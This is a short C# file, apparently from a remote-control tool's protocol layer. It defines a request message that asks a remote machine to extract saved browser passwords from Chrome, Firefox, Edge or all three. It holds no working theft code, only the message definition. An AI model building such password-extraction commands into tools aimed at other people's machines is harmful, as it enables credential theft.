using System;

namespace RemoteControl.Protocals.Request
{
    public class RequestPasswordExtract
    {
        /// <summary>
        /// 提取类型: 0=全部, 1=Chrome, 2=Firefox, 3=Edge
        /// </summary>
        public int ExtractType = 0;
    }
}
